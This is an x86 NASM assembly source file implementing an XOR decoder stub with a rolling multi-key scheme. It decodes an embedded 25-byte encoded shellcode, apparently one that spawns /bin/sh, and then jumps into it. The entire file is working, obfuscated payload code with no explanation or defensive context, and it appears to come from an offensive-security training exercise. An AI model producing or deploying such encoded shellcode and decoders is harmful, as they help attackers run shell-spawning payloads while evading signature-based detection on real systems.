; Filename: xor-decoder-multiple-keys.nasm
; Author:  Xavi Beltran
; Date: 05/05/2019

global _start			

section .text
_start:

	xor edx, edx
	mov dl, 1
	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25


decode:
	cmp dl, 0x0b
	jz xor_counter
	xor byte [esi], dl
	inc esi
	inc dl
	loop decode

	jmp short Shellcode

xor_counter:
	mov dl, 1
	jmp decode

call_decoder:

	call decoder
	Shellcode: db 0x30,0xc2,0x53,0x6c,0x2a,0x29,0x74,0x60,0x61,0x25,0x63,0x6b,0x6d,0x8d,0xe6,0x56,0x8e,0xea,0x5a,0x83,0xe0,0xb2,0x08,0xc9,0x85
